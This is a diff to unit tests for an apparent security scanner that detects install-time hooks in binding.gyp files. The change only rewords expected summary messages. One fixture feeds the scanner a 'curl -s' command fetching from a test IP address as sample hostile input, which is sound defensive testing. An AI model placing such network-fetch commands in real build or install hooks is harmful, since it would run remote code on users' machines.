@@ -68,7 +68,7 @@ class GypFindingCapTests(unittest.TestCase):
         self.assertEqual([i["line"] for i in listed], list(range(2, 2 + core.GYP_MAX_HOOK_FINDINGS)))
         self.assertEqual((summary["sev"], summary["line"]), ("MAJOR", 2 + core.GYP_MAX_HOOK_FINDINGS))
         self.assertEqual(summary["msg"], "400 more binding.gyp actions and command expansions run code at "
-                                         "install time (0 of them fetch or evaluate code); only the first "
+                                         "install time (0 of them look hostile); only the first "
                                          "100 are listed.")
         self.assertNotIn("cmd", summary)
 
@@ -77,7 +77,7 @@ class GypFindingCapTests(unittest.TestCase):
         summary = [i for i in core.scan_gyp("binding.gyp", text) if i["rule"] == "SC-INSTALL-HOOK"][-1]
         self.assertEqual(summary["sev"], "CRITICAL")
         self.assertIn("50 more binding.gyp actions", summary["msg"])
-        self.assertIn("(1 of them fetch or evaluate code)", summary["msg"])
+        self.assertIn("(1 of them look hostile)", summary["msg"])
 
     def test_expansions_count_too(self):
         issues = core.scan_gyp("binding.gyp", expansions(250, "curl -s http://192.0.2.1/x"))
